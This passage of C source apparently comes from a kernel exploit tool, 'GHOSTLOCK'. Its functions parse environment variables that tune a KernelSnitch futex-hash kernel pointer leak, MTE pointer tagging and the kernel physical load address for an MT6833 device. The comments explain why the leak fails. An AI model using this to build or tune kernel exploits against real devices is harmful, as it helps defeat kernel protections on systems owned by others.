...
/* KernelSnitch's own progress output: the collision addresses it settled on and
 * the ranges each bruteforce thread swept. Off by default because it is noisy,
 * but it is the only view into why a leak failed, so it is one env var away.
 *   GHOSTLOCK_KS_VERBOSE=1 */
size_t ks_verbose(void) {
  const char *v = getenv("GHOSTLOCK_KS_VERBOSE");
  return (v && *v && *v != '0') ? 1 : 0;
}

/* Whether kernel heap pointers carry a KASAN_HW_TAGS/MTE tag in bits [59:56].
 * The futex key hashes the whole mm pointer, so if they do and this is 0, no
 * candidate can ever match and the leak fails with no other symptom. Costs a
 * 15x longer sweep when on, which is why it is not simply always enabled.
 *   GHOSTLOCK_MTE=1 / GHOSTLOCK_MTE=0 override the target header. */
size_t ks_mte_tagged(void) {
  const char *v = getenv("GHOSTLOCK_MTE");
  if (v && *v) return (*v != '0') ? 1 : 0;
  return KS_MTE_TAGGED;
}
...
uintptr_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;

int p0_phys_load_init(void) {
  const char *v = getenv("GHOSTLOCK_PHYS_LOAD");
  if (v && *v) {
    char *end = NULL;
    unsigned long long parsed = strtoull(v, &end, 0);
    if (!end || *end != '\0' || !parsed) {
      pr_error("GHOSTLOCK_PHYS_LOAD=\"%s\" is not a valid address\n", v);
      return -1;
    }
    p0_kernel_phys_load = (uintptr_t)parsed;
  }
  if (!p0_kernel_phys_load) {
    pr_error("kernel physical load address is unknown for this build\n");
    pr_error("run with GHOSTLOCK_PHYS_LOAD=0x... (see README: P0_KERNEL_PHYS_LOAD)\n");
    return -1;
  }
  if (p0_kernel_phys_load < P0_PHYS_OFFSET) {
    pr_error("GHOSTLOCK_PHYS_LOAD %016llx is below phys_offset %016llx\n",
             (unsigned long long)p0_kernel_phys_load,
             (unsigned long long)P0_PHYS_OFFSET);
    return -1;
  }
  /* Kept for byte-for-byte reproducibility of the first successful device
   * artifact. MT6833 intentionally uses DRAM+0x80000, so this is advisory. */
  if (p0_kernel_phys_load & 0x1fffffULL) {
    pr_warning("kernel_phys_load %016llx is not 2MB aligned\n",
               (unsigned long long)p0_kernel_phys_load);
  }
  if (v && *v) {
    pr_info("kernel_phys_load from env: %016llx (delta %016llx)\n",
            (unsigned long long)p0_kernel_phys_load,
            (unsigned long long)P0_KERNEL_PHYS_DELTA);
  }
  return 0;
